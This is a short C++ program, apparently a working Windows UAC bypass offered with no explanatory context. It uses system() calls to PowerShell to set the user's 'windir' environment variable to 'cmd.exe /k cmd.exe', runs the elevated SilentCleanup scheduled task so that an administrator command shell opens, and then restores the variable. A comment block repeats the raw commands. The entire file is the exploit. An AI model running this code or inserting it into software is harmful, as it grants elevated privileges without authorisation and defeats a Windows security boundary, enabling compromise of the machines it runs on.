#include <iostream>

using namespace std;
int main(){

    system("powershell -c \"New-ItemProperty \\\"HKCU:\\Environment\\\" -Name \\\"windir\\\" -Value \\\"cmd.exe /k cmd.exe\\\" -PropertyType String -Force\"");
    system("powershell -c \"schtasks.exe /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\"");
    system("powershell -c \"New-ItemProperty \\\"HKCU:\\Environment\\\" -Name \\\"windir\\\" -Value \\\"C:\\Windows\\\" -PropertyType String -Force\"");
    return 0;
}

/*
powershell -c "New-ItemProperty \"HKCU:\Environment\" -Name \"windir\" -Value \"cmd.exe /k cmd.exe\" -PropertyType String -Force"
powershell -c "schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
powershell -c "New-ItemProperty \"HKCU:\Environment\" -Name \"windir\" -Value \"C:\Windows\" -PropertyType String -Force"
*/
